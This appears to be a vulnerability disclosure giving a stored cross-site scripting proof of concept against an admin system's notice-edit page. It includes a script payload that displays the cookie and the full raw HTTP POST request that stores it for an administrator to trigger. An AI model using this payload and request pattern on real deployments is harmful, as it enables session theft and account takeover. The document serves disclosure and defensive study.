Log in as a ry user, enter the notification announcement menu, and click the edit button.  
<img width="415" alt="image" src="https://github.com/biantaibao/octopus_XSS/assets/131763503/b39b3ccc-fe9d-4794-952e-21c695f9d894">  
Enter the malicious script into the announcement title and click save.  
<img width="414" alt="image" src="https://github.com/biantaibao/octopus_XSS/assets/131763503/932b846a-eab7-4215-bb94-bf3977f0d6d8">  
payload:<script>alert(document.cookie)</script>  
poc:  
POST /system/notice/edit HTTP/1.1  
Host: 127.0.0.1:9999  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 154  
Origin: http://127.0.0.1:9999  
Connection: close  
Referer: http://127.0.0.1:9999/system/notice/edit/1  
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704968094; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1705885425  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-origin  

noticeId=1&noticeTitle=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&noticeType=2&noticeContent=%E6%96%B0%E7%89%88%E6%9C%AC%E5%86%85%E5%AE%B9&status=0  


When we log in with the admin account, clicking on the notification management menu again will trigger the malicious code.  
<img width="414" alt="image" src="https://github.com/biantaibao/octopus_XSS/assets/131763503/a9a35600-3f55-4df9-bf1b-b20f2c53cdac">



